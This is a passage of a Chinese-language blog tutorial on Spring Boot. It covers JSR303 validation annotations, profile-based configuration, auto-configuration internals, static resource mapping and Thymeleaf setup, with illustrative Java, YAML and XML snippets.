0.9);">复杂类型封装，yml中可以封装对象 ， 使用value就不支持</font></p><h2 id="JSR303数据校验"><a href="#JSR303数据校验" class="headerlink" title="JSR303数据校验"></a>JSR303数据校验</h2><p><font style="color:rgba(0, 0, 0, 0.9);">字段是增加一层过滤器验证 ， 可以保证数据的合法性</font></p><p>常见参数：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">@NotNull(message=&quot;名字不能为空&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">String</span> <span class="hljs-string">userName;</span><br><span class="hljs-string">@Max(value=120,message=&quot;年龄最大不能查过120&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">int</span> <span class="hljs-string">age;</span><br><span class="hljs-string">@Email(message=&quot;邮箱格式错误&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">String</span> <span class="hljs-string">email;</span><br><br><span class="hljs-comment">#空检查</span><br><span class="hljs-string">@Null</span>       <span class="hljs-comment">#验证对象是否为null</span><br><span class="hljs-string">@NotNull</span>    <span class="hljs-comment">#验证对象是否不为null, 无法查检长度为0的字符串</span><br><span class="hljs-string">@NotBlank</span>   <span class="hljs-comment">#检查约束字符串是不是Null还有被Trim的长度是否大于0,只对字符串,且会去掉前后空格.</span><br><span class="hljs-string">@NotEmpty</span>   <span class="hljs-comment">#检查约束元素是否为NULL或者是EMPTY.</span><br>    <br><span class="hljs-comment">#Booelan检查</span><br><span class="hljs-string">@AssertTrue</span>     <span class="hljs-comment">#验证 Boolean 对象是否为 true  </span><br><span class="hljs-string">@AssertFalse</span>    <span class="hljs-comment">#验证 Boolean 对象是否为 false  </span><br>    <br><span class="hljs-comment">#长度检查</span><br><span class="hljs-string">@Size(min=,</span> <span class="hljs-string">max=)</span> <span class="hljs-comment">#验证对象（Array,Collection,Map,String）长度是否在给定的范围之内  </span><br><span class="hljs-string">@Length(min=,</span> <span class="hljs-string">max=)</span> <span class="hljs-string">string</span> <span class="hljs-string">is</span> <span class="hljs-string">between</span> <span class="hljs-string">min</span> <span class="hljs-string">and</span> <span class="hljs-string">max</span> <span class="hljs-string">included.</span><br><br><span class="hljs-comment">#日期检查</span><br><span class="hljs-string">@Past</span>       <span class="hljs-comment">#验证 Date 和 Calendar 对象是否在当前时间之前  </span><br><span class="hljs-string">@Future</span>     <span class="hljs-comment">#验证 Date 和 Calendar 对象是否在当前时间之后  </span><br><span class="hljs-string">@Pattern</span>    <span class="hljs-comment">#验证 String 对象是否符合正则表达式的规则</span><br></code></pre></td></tr></table></figure><h2 id="多环境切换"><a href="#多环境切换" class="headerlink" title="多环境切换"></a>多环境切换</h2><p><font style="color:rgba(0, 0, 0, 0.9);">profile是Spring对不同环境提供不同配置功能的支持，可以通过激活不同的环境版本，实现快速切换环境；</font></p><h3 id="多配置文件"><a href="#多配置文件" class="headerlink" title="多配置文件"></a>多配置文件</h3><p><font style="color:rgba(0, 0, 0, 0.9);">我们在主配置文件编写的时候，文件名可以是 application-{profile}.properties&#x2F;yml , 用来指定多个环境版本；</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">例如：</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">application-test.properties 代表测试环境配置</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">application-dev.properties 代表开发环境配置</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">但是Springboot并不会直接启动这些配置文件，它</font><strong><font style="color:rgba(0, 0, 0, 0.9);">默认使用application.properties主配置文件</font></strong><font style="color:rgba(0, 0, 0, 0.9);">；</font></p><h3 id="yaml的多文档块"><a href="#yaml的多文档块" class="headerlink" title="yaml的多文档块"></a>yaml的多文档块</h3><p><font style="color:rgba(0, 0, 0, 0.9);">和properties配置文件中一样，但是使用yml去实现不需要创建多个配置文件</font></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span><br><span class="hljs-comment">#选择要激活那个环境块</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span>    <br>    <span class="hljs-attr">active:</span> <span class="hljs-string">prod</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8083</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">dev</span> <span class="hljs-comment">#配置环境的名称</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8084</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">prod</span>  <span class="hljs-comment">#配置环境的名称</span><br></code></pre></td></tr></table></figure><p><strong><font style="color:rgba(0, 0, 0, 0.9);">注意：如果yml和properties同时都配置了端口，并且没有激活其他环境 ， 默认会使用properties配置文件的！</font></strong></p><h3 id="配置文件加载位置"><a href="#配置文件加载位置" class="headerlink" title="配置文件加载位置"></a>配置文件加载位置</h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">外部加载配置文件的方式十分多，我们选择最常用的即可，在开发的资源文件中进行配置！</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">springboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件：</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">优先级1：项目路径下的config文件夹配置文件</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">优先级2：项目路径下配置文件</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">优先级3：资源路径下的config文件夹配置文件</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">优先级4：资源路径下配置文件</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">优先级由高到底，高优先级的配置会覆盖低优先级的配置；</font></p><h2 id="自动配置原理"><a href="#自动配置原理" class="headerlink" title="自动配置原理"></a>自动配置原理</h2><p><strong><font style="color:rgba(0, 0, 0, 0.9);">来到 </font></strong><font style="color:rgba(0, 0, 0, 0.9);">META-INF&#x2F;spring.factories<br></font><font style="color:rgba(0, 0, 0, 0.9);">以其中的 HttpEncodingAutoConfiguration 为例分析</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">spring.http.  在高版本已经弃用</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304953.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//声明这是 spring 配置类</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-comment">//启用对 ServerProperties 的配置属性绑定，Spring Boot 会把配置文件中 server.* 的属性绑定到 ServerProperties 对象中</span><br><span class="hljs-meta">@EnableConfigurationProperties(ServerProperties.class)</span><br><span class="hljs-comment">//条件注解，表示此配置类 仅在 Web 应用且使用 Servlet 类型时生效</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = ConditionalOnWebApplication.Type.SERVLET)</span><br><span class="hljs-comment">//表示只有类路径中存在 CharacterEncodingFilter(Spring 提供的过滤器，用于设置请求和响应的字符编码) 时，这个配置才会生效。</span><br><span class="hljs-meta">@ConditionalOnClass(CharacterEncodingFilter.class)</span><br><span class="hljs-comment">//条件注解，用于检查 配置文件中某个属性</span><br><span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;server.servlet.encoding&quot;, value = &quot;enabled&quot;, matchIfMissing = true)</span><br><span class="hljs-comment">//从 ServerProperties 中提取编码配置</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpEncodingAutoConfiguration</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Encoding properties;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpEncodingAutoConfiguration</span><span class="hljs-params">(ServerProperties properties)</span> &#123;<br>        <span class="hljs-built_in">this</span>.properties = properties.getServlet().getEncoding();<br>    &#125;<br><br>    <span class="hljs-comment">//声明一个 Spring Bean，返回类型为 CharacterEncodingFilter </span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConditionalOnMissingBean</span><br>    <span class="hljs-keyword">public</span> CharacterEncodingFilter <span class="hljs-title function_">characterEncodingFilter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">CharacterEncodingFilter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderedCharacterEncodingFilter</span>();<br>        filter.setEncoding(<span class="hljs-built_in">this</span>.properties.getCharset().name());<br>        filter.setForceRequestEncoding(<span class="hljs-built_in">this</span>.properties.shouldForce(Encoding.Type.REQUEST));<br>        filter.setForceResponseEncoding(<span class="hljs-built_in">this</span>.properties.shouldForce(Encoding.Type.RESPONSE));<br>        <span class="hljs-keyword">return</span> filter;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进 ServerProperties.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;server&quot;, ignoreUnknownFields = true)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerProperties</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Server HTTP port.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> Integer port;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Network address to which the server should bind.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> InetAddress address;<br><br>    <span class="hljs-meta">@NestedConfigurationProperty</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ErrorProperties</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorProperties</span>();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Strategy for handling X-Forwarded-* headers.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> ForwardHeadersStrategy forwardHeadersStrategy;<br>    ...<br></code></pre></td></tr></table></figure><p>那么 yaml 中可以写的配置即为</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251306965.png"></p><h3 id="小结：-2"><a href="#小结：-2" class="headerlink" title="小结："></a>小结：</h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">xxxxAutoConfigurartion：自动配置类</font></strong></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">xxxxProperties： 配置属性类  </font></strong></p><p><strong>– debug: true  查看生效的自动配置类</strong></p><hr><h1 id="4、SpringBoot-Web-开发"><a href="#4、SpringBoot-Web-开发" class="headerlink" title="4、SpringBoot Web 开发"></a>4、SpringBoot Web 开发</h1><h2 id="4-1-静态资源"><a href="#4-1-静态资源" class="headerlink" title="4.1 静态资源"></a>4.1 静态资源</h2><h3 id="4-1-1-静态资源映射规则"><a href="#4-1-1-静态资源映射规则" class="headerlink" title="4.1.1 静态资源映射规则"></a>4.1.1 静态资源映射规则</h3><p><font style="color:#080808;background-color:#ffffff;">WebMvcAutoConfiguration -&gt; EnableWebMvcConfiguration -&gt; addResourceHandlers</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> &#123;<br>    <span class="hljs-comment">//resourceProperties.isAddMappings() 读取静态资源配置</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resourceProperties.isAddMappings()) &#123;<br>        logger.debug(<span class="hljs-string">&quot;Default resource handling disabled&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//WebJars 是一种把 JS、CSS 打包成 jar 的方式，这里让 /webjars/... 直接访问到 jar 包里的静态文件</span><br>    addResourceHandler(registry, <span class="hljs-string">&quot;/webjars/**&quot;</span>, <span class="hljs-string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>);<br>    <span class="hljs-comment">//映射普通静态资源</span><br>    addResourceHandler(registry, <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern(), (registration) -&gt; &#123;<br>        registration.addResourceLocations(<span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations());<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.servletContext != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ServletContextResource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletContextResource</span>(<span class="hljs-built_in">this</span>.servletContext, SERVLET_LOCATION);<br>            registration.addResourceLocations(resource);<br>        &#125;<br>    &#125;);<br>    &#125;<br>    <span class="hljs-comment">//提供一个更简化的调用方式，只传 URL 模式和物理路径，不需要自己写 Consumer</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandler</span><span class="hljs-params">(ResourceHandlerRegistry registry, String pattern, String... locations)</span> &#123;<br>        addResourceHandler(registry, pattern, (registration) -&gt; registration.addResourceLocations(locations));<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandler</span><span class="hljs-params">(ResourceHandlerRegistry registry, String pattern,</span><br><span class="hljs-params">                                    Consumer&lt;ResourceHandlerRegistration&gt; customizer)</span> &#123;<br>        <span class="hljs-keyword">if</span> (registry.hasMappingForPattern(pattern)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">ResourceHandlerRegistration</span> <span class="hljs-variable">registration</span> <span class="hljs-operator">=</span> registry.addResourceHandler(pattern);<br>        customizer.accept(registration);<br>        registration.setCachePeriod(getSeconds(<span class="hljs-built_in">this</span>.resourceProperties.getCache().getPeriod()));<br>        registration.setCacheControl(<span class="hljs-built_in">this</span>.resourceProperties.getCache().getCachecontrol().toHttpCacheControl());<br>        registration.setUseLastModified(<span class="hljs-built_in">this</span>.resourceProperties.getCache().isUseLastModified());<br>        customizeResourceHandlerRegistration(registration);<br>    &#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">Webjars本质就是以jar包的方式引入静态资源</font></p><p><a href="https://www.webjars.org/">https://www.webjars.org/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jquery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">要使用jQuery，只要要引入jQuery对应版本的pom依赖即可</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);"></font></p><p>另一种规则：<font style="color:rgba(0, 0, 0, 0.9);">&#x2F;**</font></p><p><font style="color:#080808;background-color:#ffffff;">WebProperties -&gt; getStaticLocations -&gt; staticLocations -&gt; CLASSPATH_RESOURCE_LOCATIONS -&gt; </font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">//以下四个目录存放的静态资源可以被识别<br>&quot;classpath:/META-INF/resources/&quot;,<br>&quot;classpath:/resources/&quot;, <br>&quot;classpath:/static/&quot;, <br>&quot;classpath:/public/&quot;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String[] getStaticLocations() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.staticLocations;<br>&#125;<br><br><span class="hljs-keyword">private</span> String[] staticLocations = CLASSPATH_RESOURCE_LOCATIONS;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] CLASSPATH_RESOURCE_LOCATIONS = &#123; <span class="hljs-string">&quot;classpath:/META-INF/resources/&quot;</span>,<br>                                                               <span class="hljs-string">&quot;classpath:/resources/&quot;</span>, <span class="hljs-string">&quot;classpath:/static/&quot;</span>, <span class="hljs-string">&quot;classpath:/public/&quot;</span> &#125;;<br></code></pre></td></tr></table></figure><hr><p>优先级：resources &gt; static &gt; public</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304624.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304716.png"></p><h3 id="4-1-2-首页"><a href="#4-1-2-首页" class="headerlink" title="4.1.2 首页"></a>4.1.2 首页</h3><p><font style="color:rgba(0, 0, 0, 0.9);">静态资源文件夹下的所有 index.html 页面</font></p><p><font style="color:rgba(0, 0, 0, 0.9);"></font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> WelcomePageHandlerMapping <span class="hljs-title function_">welcomePageHandlerMapping</span><span class="hljs-params">(ApplicationContext applicationContext,</span><br><span class="hljs-params">                                                           FormattingConversionService mvcConversionService, ResourceUrlProvider mvcResourceUrlProvider)</span> &#123;<br>    <span class="hljs-type">WelcomePageHandlerMapping</span> <span class="hljs-variable">welcomePageHandlerMapping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WelcomePageHandlerMapping</span>(<br>        <span class="hljs-comment">//检测模板引擎（Thymeleaf、Freemarker 等）是否可用，以判断欢迎页是模板还是静态文件</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateAvailabilityProviders</span>(applicationContext), <br>        <span class="hljs-comment">//查找模板、静态文件</span><br>        applicationContext, <br>        <span class="hljs-comment">//查找实际的欢迎页资源</span><br>        getWelcomePage(),<br>        <span class="hljs-comment">//欢迎页匹配路径模式</span><br>        <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern()<br>    );<br>    <span class="hljs-comment">//设置拦截器</span><br>    welcomePageHandlerMapping.setInterceptors(<br>        getInterceptors(mvcConversionService, mvcResourceUrlProvider)<br>    );<br>    <span class="hljs-comment">//设置 CORS</span><br>    welcomePageHandlerMapping.setCorsConfigurations(<br>        getCorsConfigurations()<br>    );<br>    <span class="hljs-keyword">return</span> welcomePageHandlerMapping;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 getWelcomePage()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Resource <span class="hljs-title function_">getWelcomePage</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//遍历静态资源位置</span><br>    <span class="hljs-keyword">for</span> (String location : <span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations()) &#123;<br>        <span class="hljs-type">Resource</span> <span class="hljs-variable">indexHtml</span> <span class="hljs-operator">=</span> getIndexHtml(location);<br>        <span class="hljs-keyword">if</span> (indexHtml != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> indexHtml;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//检查 ServletContext 下的欢迎页</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> getServletContext();<br>    <span class="hljs-keyword">if</span> (servletContext != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> getIndexHtml(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletContextResource</span>(servletContext, SERVLET_LOCATION));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-Thymeleaf模板引擎"><a href="#4-2-Thymeleaf模板引擎" class="headerlink" title="4.2 Thymeleaf模板引擎"></a>4.2 <font style="color:rgba(0, 0, 0, 0.9);">Thymeleaf模板引擎</font></h2><p><a href="https://www.thymeleaf.org/">https://www.thymeleaf.org/</a></p><p><a href="https://github.com/thymeleaf/thymeleaf">https://github.com/thymeleaf/thymeleaf</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304509.png"></p><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--thymeleaf--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">Thymeleaf的自动配置类：ThymeleafProperties</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.thymeleaf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThymeleafProperties</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Charset</span> <span class="hljs-variable">DEFAULT_ENCODING</span> <span class="hljs-operator">=</span> StandardCharsets.UTF_8;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;classpath:/templates/&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SUFFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.html&quot;</span>;<br></code></pre></td></tr></table></figure><p>那么只要在 templates 中写 .html 页面就可以完成 <font style="color:rgba(0, 0, 0, 0.9);">Thymeleaf 模板</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-comment">// 在 templates 目录下的所有页面，只能通过 controller 来跳转</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span 